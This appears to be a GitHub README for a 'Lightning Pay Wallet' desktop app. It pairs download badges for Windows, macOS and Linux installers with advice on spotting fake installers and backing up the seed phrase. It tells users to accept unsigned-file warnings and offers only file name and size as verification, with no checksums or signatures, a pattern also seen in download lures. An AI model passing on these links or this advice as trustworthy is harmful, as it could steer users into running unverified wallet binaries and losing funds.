<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# Downloading Lightning Pay on Windows and macOS without getting a fake
One source, three file names, and the checks that take ten seconds.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

Installing a wallet is the moment most losses begin, and almost all of them are avoidable by checking
where the file came from. This page is the short version of that check.

## The only source

Every official installer is attached to the release on the app repository, and every page on this site
links there. The release page lists the files by name:

- `lightning-pay-wallet-windows-v1.2.1.exe`
- `lightning-pay-wallet-macos-v1.2.1.dmg`
- `lightning-pay-wallet-linux-v1.2.1.zip`

If a download page offers a different name, an installer wrapped in a download manager, or a "fast
mirror", it is not this product. A search ad above the repository is the most common trap.

## The check

Look at the address bar, not the page design. A genuine link contains
`github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/`. Then compare the file
name with the list above.

Two checks, ten seconds, and they eliminate the entire category of fake-installer scams.

## Windows

Windows may warn about an unsigned or newly published executable. That warning is about reputation,
not about this file specifically; a file downloaded from anywhere else deserves the same warning and
more suspicion. Do not disable security software to install a wallet, ever.

## macOS

macOS may refuse an application from an unidentified developer. Open it through System Settings rather
than turning off Gatekeeper entirely: the per-application exception is the narrow fix.

## After installing

Create the wallet, write the phrase on paper, and test a restore before funding it. The install is the
easy part; the backup is the part that decides whether you still have the money in a year.

If you are unsure whether a page is official, close it and start from
[what Lightning Pay Wallet is](https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/what-lightning-pay-wallet-is.md)
instead.

## Questions people ask

### Is there a mobile download?

The current release is desktop. A mobile build is being rebuilt, so no official mobile installer exists
yet.

### Why does my browser warn about the file?

Because it is new or unsigned. The warning is not proof of a problem; the download source is what
matters.

### Can I verify the download?

The release page is the reference. If you want more, compare the file name and size against the release
listing before running it.

## Related guides

- [What Lightning Pay Wallet is, and what it is not](https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/what-lightning-pay-wallet-is.md)
- [How to get a Lightning wallet and open your first one](https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/how-to-get-a-lightning-wallet.md)

